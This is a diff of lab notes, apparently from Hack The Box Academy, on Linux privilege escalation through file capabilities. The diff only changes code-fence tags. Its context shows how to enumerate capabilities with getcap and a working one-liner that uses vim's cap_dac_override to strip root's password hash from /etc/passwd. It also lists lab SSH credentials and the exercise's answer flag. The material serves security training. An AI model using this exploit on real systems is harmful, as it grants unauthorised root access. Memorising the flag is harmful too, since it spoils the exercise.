@@ -6,7 +6,7 @@ One common vulnerability is using capabilities to grant privileges to processes 
 ## Set Capability
 We can use the setcap command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.
 
-```sh
+```shellsession
 $ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
 ```
 
@@ -21,7 +21,7 @@ Several Linux capabilities can be used to escalate a user's privileges to `root`
 ## Enumerating Capabilities
 To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:
 
-```sh
+```shellsession
 $ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
 
 /usr/bin/vim.basic cap_dac_override=eip
@@ -34,7 +34,7 @@ This one-liner uses the `find` command to search for all binary executables in t
 ## Exploitation
 If we gained access to the system with a low-privilege account, then discovered the `cap_dac_override` capability:
 
-```sh
+```shellsession
 $ getcap /usr/bin/vim.basic
 
 /usr/bin/vim.basic cap_dac_override=eip
@@ -42,7 +42,7 @@ $ getcap /usr/bin/vim.basic
 
 We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:
 
-```sh
+```shellsession
 $ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
 $ cat /etc/passwd | head -n1
 
@@ -55,7 +55,7 @@ Now, we can see that the `x` in that line is gone (before it was `root:x:0:0:roo
 SSH to 10.129.205.111 (ACADEMY-LLPE-CAP), with user `htb-student` and password `HTB_@cademy_stdnt!`
 1. Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer. **Answer: HTB{c4paBili7i3s_pR1v35c}**
    - List all existing capabilities for all existing binary executables:
-        ```sh
+        ```shellsession
         $ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
         /usr/bin/mtr-packet = cap_net_raw+ep
         /usr/bin/ping = cap_net_raw+ep
@@ -63,7 +63,7 @@ SSH to 10.129.205.111 (ACADEMY-LLPE-CAP), with user `htb-student` and password `
         /usr/bin/vim.basic = cap_dac_override+eip
         ```
    - Leverage vim with cap_dac_override capability set to modify the root entry in /etc/passwd to escalate privilege to root:
-        ```sh
+        ```shellsession
         $ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
         $ cat /etc/passwd | head -n1
         root::0:0:root:/root:/bin/bash
